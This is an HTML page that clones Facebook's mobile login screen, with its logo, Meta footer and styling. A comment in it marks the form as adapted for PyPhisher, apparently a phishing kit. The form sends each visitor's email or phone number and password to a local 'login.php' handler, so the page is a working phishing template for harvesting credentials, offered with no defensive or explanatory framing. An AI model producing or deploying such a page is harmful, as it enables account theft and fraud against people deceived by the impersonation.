<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook – log in</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      margin: 0;
      padding: 0;
      font-family: system-ui, sans-serif;
      box-sizing: border-box;
    }

    body {
      background: #f0f2f5;
      color: #1c1e21;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 1.5em 1em;
    }

    .top-text {
      color: #1877f2;
      font-size: 0.9em;
      margin-bottom: 10px;
    }

    .lang {
      margin-bottom: 10px;
      color: #606770;
      font-size: 0.85em;
    }

    .logo {
      margin: 34px 0;
    }

    .logo img {
      width: 60px;
      height: 60px;
    }

    .form {
      width: 100%;
      max-width: 350px;
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-top: 70px;
    }

    input[type="text"],
    input[type="password"] {
      padding: 20px;
      border: 2px solid #dddfe2;
      border-radius: 14px;
      font-size: 1em;
    }

    .login-btn {
      background-color: #1877f2;
      color: white;
      padding: 14px;
      border: none;
      border-radius: 22px;
      font-size: 1em;
      font-weight: bold;
      cursor: pointer;
    }

    .forgot {
      margin-top: 10px;
      text-align: center;
      color: #606770;
      font-size: 0.9em;
    }

    .create-btn {
      background-color: white;
      color: #1877f2;
      padding: 14px;
      border: 1px solid #1877f2;
      border-radius: 22px;
      font-size: 1em;
      font-weight: bold;
      cursor: pointer;
      margin-top: 40px;
    }

    .meta-logo {
      margin-top: 20px;
      text-align: center;
      font-size: 0.9em;
      color: #606770;
    }

    .meta-logo img {
      width: 60px;
      height: auto;
    }

    .footer-links {
      margin-top: 3px;
      display: flex;
      justify-content: center;
      gap: 15px;
      font-size: 0.9em;
      color: #606770;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <div class="top-text">Get Facebook for Android and browse faster.</div>
  <div class="lang">English (UK)</div>

  <div class="logo">
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
  </div>

  <!-- Changed action to 'login.php' for PyPhisher -->
  <form class="form" method="POST" action="login.php">
    <input type="text" name="email" placeholder="Mobile number or email address" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit" class="login-btn">Log in</button>
  </form>

  <div class="forgot">Forgotten password?</div>

  <div class="form">
    <button class="create-btn">Create new account</button>
  </div>

  <div class="meta-logo">
    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yg/r/6EMh2DWYp9P.png" alt="Meta Logo">
    <div class="footer-links">
      <span>About</span>
      <span>Help</span>
      <span>More</span>
    </div>
  </div>

</body>
</html>
